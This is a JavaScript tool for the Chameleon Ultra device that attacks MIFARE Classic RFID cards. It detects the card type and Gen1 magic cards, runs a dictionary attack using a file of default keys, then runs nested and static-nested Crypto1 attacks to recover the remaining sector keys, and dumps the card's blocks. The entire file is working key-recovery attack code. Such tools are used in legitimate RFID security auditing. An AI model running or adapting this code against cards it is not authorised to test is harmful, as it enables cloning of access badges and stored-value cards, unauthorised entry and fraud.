import { Mf1PrngType, ChameleonUltra, DeviceMode, Buffer, Mf1KeyType } from 'chameleon-ultra.js'
import SerialPortAdapter from 'chameleon-ultra.js/plugin/SerialPortAdapter'
import Crypto1 from 'chameleon-ultra.js/Crypto1'
import fs from 'fs'
import chalk from 'chalk';

let defaultKeys = fs.readFileSync('mfc_default_keys.dic', 'utf8').split('\n').filter(line => !line.startsWith('#'));
let defaultKeysIndex = 0;

let validKeys = new Array();

let mf1BlockCount = 0;
let mf1BlockIndex = 0;

let dump = "";
let dumpObj = {};


async function main() {
    let ultraUsb = new ChameleonUltra();
    await ultraUsb.use(new SerialPortAdapter());

    console.log(chalk.blueBright(`version: ${await ultraUsb.cmdGetAppVersion()} (${await ultraUsb.cmdGetGitVersion()}) Battery: ${JSON.stringify(await ultraUsb.cmdGetBatteryInfo())} `));

    // set CU to reader mode
    await ultraUsb.cmdChangeDeviceMode(DeviceMode.READER);

    let tag = await ultraUsb.hf14aInfo();
    // console.log("tag:", tag);

    if (tag) {
        let magic1a = false;

        if (tag[0].nxpTypeBySak?.includes("MIFARE Classic 1K")) {
            mf1BlockCount = 16 * 4;
            magic1a = await mifare_classic_check_gen1(ultraUsb);
        } else if (tag[0].nxpTypeBySak?.includes("MIFARE Classic 4K")) {
            mf1BlockCount = 40 * 4;
            magic1a = await mifare_classic_check_gen1(ultraUsb);
        } else {
            mf1BlockCount = 16 * 4;
        }



        console.log(chalk.yellow("type:", tag[0].nxpTypeBySak))
        console.log(chalk.yellow("UID:", tag[0].antiColl.uid.toString('hex').toUpperCase(), "ATQA:", tag[0].antiColl.atqa.toString('hex').toUpperCase(), "SAK:", tag[0].antiColl.sak.toString('hex').toUpperCase()));
        console.log(chalk.yellow("PRNG type:", Mf1PrngType[tag[0].prngType]))
        console.log(chalk.yellow("Block count:", mf1BlockCount))
        magic1a && console.log(chalk.magentaBright("Magic 1A FOUND!"))

        console.time("took");

        await mifare_classic_attack(ultraUsb, true, tag[0].prngType);
        await mifare_classic_attack(ultraUsb, false, tag[0].prngType);

        await mifare_classic_dump(ultraUsb);

        console.log(dump);
        console.timeEnd("took");

        process.exit(0)
    }
}

async function mifare_classic_check_dictionary(ultraUsb, keyA = true) {
    if (validKeys.length > 0) {
        console.log(chalk.redBright("Stopping dictionary attack because we already got a key..."));
    } else {
        console.log(chalk.blueBright("Checking dictionary..."));
        while (defaultKeysIndex < defaultKeys.length) {
            let authKey = Buffer.from(defaultKeys[defaultKeysIndex++], 'hex');

            let read = await mifare_classic_check_key(ultraUsb, mf1BlockIndex, authKey, keyA);

            if (read) {
                validKeys.push({ key: authKey, block: mf1BlockIndex, keyA: keyA });
                break;
            }
        }
    }
}

async function mifare_classic_attack(ultraUsb, keyA = true, prngType = Mf1PrngType.WEAK) {
    defaultKeysIndex = 0;
    mf1BlockIndex = 3;

    await mifare_classic_check_dictionary(ultraUsb, keyA);

    while (mf1BlockIndex < mf1BlockCount) {
        let foundKey = false;

        for (let i = 0; i < validKeys.length; i++) {
            let authKey = validKeys[i].key;
            let check = await mifare_classic_check_key(ultraUsb, mf1BlockIndex, authKey, keyA);

            if (check) {
                foundKey = true;
                break;
            }
        }

        if (!foundKey) {
            switch (prngType) {
                case Mf1PrngType.WEAK:
                    await mifare_classic_nested_attack(ultraUsb, validKeys[0].block, validKeys[0].key, validKeys[0].keyA, mf1BlockIndex, keyA);
                    break;
                case Mf1PrngType.STATIC:
                    await mifare_classic_static_nested_attack(ultraUsb, validKeys[0].block, validKeys[0].key, validKeys[0].keyA, mf1BlockIndex, keyA);
                    break;
            }

            for (let i = 0; i < validKeys.length; i++) {
                let authKey = validKeys[i].key;
                let check = await mifare_classic_check_key(ultraUsb, mf1BlockIndex, authKey, keyA);

                if (check) {
                    foundKey = true;
                    break;
                }
            }
        }

        if (!foundKey) {
            console.log(chalk.redBright("No key found for block:", mf1BlockIndex, "key type:", keyA ? "A" : "B"));
        }

        mf1BlockIndex += 4;
    }
}

function add_nested_keys(keys, blockIndex) {
    keys.map(key => { validKeys.push({ key: key, block: blockIndex }) });
    validKeys = validKeys.filter((thing, index, self) =>
        index === self.findIndex((t) => (
            t.key.equals(thing.key)
        ))
    )
    // move all keys inside keys array to the top of validKeys array
    keys.map(key => {
        validKeys = validKeys.filter(item => !item.key.equals(key));
        validKeys.unshift({ key: key, block: blockIndex });
    });
}

async function mifare_classic_dump(ultraUsb) {
    console.log(chalk.blueBright("Dumping..."));
    for (let i = 0; i < mf1BlockCount; i++) {
        if (i % 4 == 0) {
            if (!dumpObj[i + 3]?.keyA) {
                console.log("No key found for block:", i, "key type:", "A");
                dump += "????????????????????????????????\r\n";
            } else {
                await mifare_classic_read_block(ultraUsb, i, Buffer.from(dumpObj[i + 3]?.keyA, 'hex'), true);
            }
        } else if (i % 4 == 1) {
            if (!dumpObj[i + 2]?.keyA) {
                console.log("No key found for block:", i, "key type:", "A");
                dump += "????????????????????????????????\r\n";
            } else {
                await mifare_classic_read_block(ultraUsb, i, Buffer.from(dumpObj[i + 2]?.keyA, 'hex'), true);
            }
        } else if (i % 4 == 2) {
            if (!dumpObj[i + 1]?.keyA) {
                console.log("No key found for block:", i, "key type:", "A");
                dump += "????????????????????????????????\r\n";
            } else {
                await mifare_classic_read_block(ultraUsb, i, Buffer.from(dumpObj[i + 1]?.keyA, 'hex'), true);
            }
        } else if (i % 4 == 3) {
            if (!dumpObj[i + 0]?.keyA || !dumpObj[i + 0]?.keyB) {
                console.log("No key found for block:", i, "key type:", "A");
                dump += "????????????????????????????????\r\n";
            } else {
                await mifare_classic_read_block(ultraUsb, i, Buffer.from(dumpObj[i + 0]?.keyA, 'hex'), true);
                await mifare_classic_read_block(ultraUsb, i, Buffer.from(dumpObj[i + 0]?.keyB, 'hex'), false);
            }
        }
    }
}

async function mifare_classic_check_key(ultraUsb, block, key, keyA = true) {
    // check if block already got key
    if (dumpObj[block] && dumpObj[block][keyA ? "keyA" : "keyB"]) {
        console.log(chalk.redBright("Block", block, "already got key", keyA ? "A" : "B"));
        return true;
    }

    let read = await ultraUsb.cmdMf1CheckBlockKey({
        block: block,
        keyType: keyA ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B,
        key: key
    })

    if (read) {
        // console.log("Valid key:", key.toString('hex').toUpperCase(), "for block:", block, "key type:", keyA ? "A" : "B");
        console.log(chalk.greenBright("Valid key:", key.toString('hex').toUpperCase(), "for block:", block, "key type:", keyA ? "A" : "B"));

        // put the key as first in validKeys array so it will be used first on next block
        validKeys = validKeys.filter(item => !item.key.equals(key));
        validKeys.unshift({ key: key, block: block, keyA: keyA });

        if (keyA) {
            dumpObj[block] = { keyA: key.toString('hex').toUpperCase() };
        } else {
            dumpObj[block].keyB = key.toString('hex').toUpperCase();
        }
    }

    return read;
}

async function mifare_classic_read_block(ultraUsb, blockIndex, key, keyA = true) {
    try {
        let block = await ultraUsb.cmdMf1ReadBlock({
            block: blockIndex,
            keyType: keyA ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B,
            key: key
        })

        if (block) {
            block = block.toString('hex').toUpperCase();

            if (blockIndex % 4 == 3) {
                if (keyA) {
                    dumpObj[blockIndex].data = key.toString('hex').toUpperCase() + block.substring(12);
                } else {
                    dumpObj[blockIndex].data = dumpObj[blockIndex].data.substring(0, 20) + key.toString('hex').toUpperCase()
                    dump += dumpObj[blockIndex].data + "\r\n";
                }
            } else {
                dumpObj[blockIndex] = { data: block };
                dump += dumpObj[blockIndex].data + "\r\n";
            }

            return true;
        }
    } catch (error) {
        console.log("Error reading block:", blockIndex);
        return false;
    }
}

async function mifare_classic_nested_attack(ultraUsb, block1, key1, keyA1, block2, keyA2) {
    console.log(chalk.blueBright("Nested attack..."));
    try {
        let res1 = await ultraUsb.cmdMf1TestNtDistance({ block: block1, keyType: keyA1 ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B, key: key1 })
        let res2 = await ultraUsb.cmdMf1AcquireNested(
            { block: block1, keyType: keyA1 ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B, key: key1 },
            { block: block2, keyType: keyA2 ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B },
        )

        let res = {
            uid: res1.uid.toString('hex'),
            dist: res1.dist.toString('hex'),
            atks: res2.map(item => ({
                nt1: item.nt1.toString('hex'),
                nt2: item.nt2.toString('hex'),
                par: item.par,
            }))
        }

        let nestedCanidateKeys = Crypto1.nested(res);
        add_nested_keys(nestedCanidateKeys, block2);
    } catch (error) {
        console.log(chalk.redBright("Error in nested attack:", error));
    }
}

async function mifare_classic_static_nested_attack(ultraUsb, block1, key1, keyA1, block2, keyA2) {
    console.log(chalk.blueBright("Static nested attack..."));

    try {
        let res1 = await ultraUsb.cmdMf1TestNtDistance({ block: block1, keyType: keyA1 ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B, key: key1 })
        let res2 = await ultraUsb.cmdMf1AcquireStaticNested(
            { block: block1, keyType: keyA1 ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B, key: key1 },
            { block: block2, keyType: keyA2 ? Mf1KeyType.KEY_A : Mf1KeyType.KEY_B },
        )

        let res = {
            uid: res1.uid.toString('hex'),
            dist: res1.dist.toString('hex'),
            atks: res2.map(item => ({
                nt1: item.nt1.toString('hex'),
                nt2: item.nt2.toString('hex'),
                par: item.par,
            }))
        }

        let nestedCanidateKeys = Crypto1.nested(res);
        add_nested_keys(nestedCanidateKeys, block2);
    } catch (error) {
        console.log(chalk.redBright("Error in static nested attack:", error));
    }
}

async function mifare_classic_check_gen1(ultraUsb) {
    try {
        const resp1 = await ultraUsb.cmdHf14aRaw({ data: Buffer.from('40', 'hex'), dataBitLength: 7, keepRfField: true }) // 0x40 (7)
        const resp2 = await ultraUsb.cmdHf14aRaw({ data: Buffer.from('43', 'hex'), keepRfField: true }) // 0x43

        if (resp1[0] === 0x0A || resp2[0] === 0x0A) {
            return true;
        }
    } catch (error) {
        return false;
    }
}

main().catch(err => {
    console.error(err)
    process.exit(1)
})

